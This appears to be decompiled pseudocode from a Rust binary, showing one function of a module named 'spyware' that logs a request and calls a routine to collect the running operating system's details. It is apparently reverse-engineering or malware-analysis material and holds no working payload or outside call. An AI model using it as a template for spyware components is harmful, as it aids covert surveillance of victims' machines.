fn spyware::actions::basic_info::get_basic_info_request() -> : struct24 {
    let a0: i64;  // rdi
    let v0: struct40;  // [bp-0x60]
    let v1: struct40;  // [bp-0x38]

    if core::sync::atomic::atomic_load() >= 4 {
        v1 = struct40 {
            field_0: "Handling get basic info request"
            field_8: 1
            field_16: 8
            field_24: 0
        };
        v0 = struct40 {
            field_0: "spyware::actions::basic_info"
            field_16: "spyware::actions::basic_info"
            field_32: log::__private_api::loc("src/actions/basic_info.rs")
        };
        log::__private_api::log(&v1, 4, &v0);
    }
    spyware::actions::basic_info::get_running_os_info(a0);
    *((a0 + 56) as &i32) = 1;
    *((a0 + 62) as &i8) = 1;
    *((a0 + 60) as &i16) = 257;
    *((a0 + 24) as &i64) = 0x8000000000000000;
    return;
}
